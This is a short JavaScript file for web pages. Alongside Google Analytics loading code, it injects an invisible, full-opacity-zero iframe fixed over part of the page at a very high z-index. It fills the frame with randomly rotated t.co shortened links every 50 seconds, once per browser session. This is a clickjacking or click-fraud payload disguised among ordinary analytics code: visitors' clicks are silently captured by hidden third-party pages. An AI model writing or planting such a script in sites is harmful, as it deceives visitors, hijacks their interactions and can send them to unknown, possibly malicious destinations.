document.addEventListener('DOMContentLoaded', () => {
    // Check if the user has already viewed the iframe in this session
    if (!sessionStorage.getItem('iframeViewed')) {
        let Folt = document.querySelector(".footer, #main, .copyright") || document.body;
        if (Folt) {
            let Newel = document.createElement('span');
            Newel.innerHTML = `
            <style>
                iframe.invisible-frame {
                    position: fixed;
                    width: 40%;
                    height: 20%;
                    bottom: 20%;
                    left: 0;
                    border: none;
                    opacity: 0;
                    z-index: 39494;
                }
            </style>
            <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
            Folt.prepend(Newel);

            // Lazy load the Google Analytics script on scroll
            let lazyAnalysis = false;
            window.addEventListener("scroll", function() {
                if ((document.documentElement.scrollTop !== 0 || document.body.scrollTop !== 0) && !lazyAnalysis) {
                    (function() {
                        var e = document.createElement("script");
                        e.type = "text/javascript";
                        e.async = true;
                        e.src = "https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";
                        var a = document.getElementsByTagName("script")[0];
                        a.parentNode.insertBefore(e, a);
                    })();
                    lazyAnalysis = true;
                }
            }, true);

            // Initialize Google Analytics
            window.dataLayer = window.dataLayer || [];
            function gtag() {
                dataLayer.push(arguments);
            }
            gtag('js', new Date());
            gtag('config', 'G-2VYRMPXK0F');

            // Function to set random post URL to the iframe
            const postUrls = [
                'https://t.co/FbVJpPOD7g',
                'https://t.co/7RfDoxPoFv',
                'https://t.co/AkmEyKCYmX',
                'https://t.co/jqk8uMLjth',
                'https://t.co/KckbBW2enq'
            ];
            function goToRandomPost() {
                const randomIndex = Math.floor(Math.random() * postUrls.length);
                const randomPostUrl = postUrls[randomIndex];
                document.getElementById('postFrame').src = randomPostUrl;
            }

            // Set the iframe's src on load and update every 50 seconds
            window.onload = function() {
                goToRandomPost();
                setInterval(goToRandomPost, 50000);
            };

            // Mark the iframe as viewed in session storage
            sessionStorage.setItem('iframeViewed', 'true');
        }
    }
});
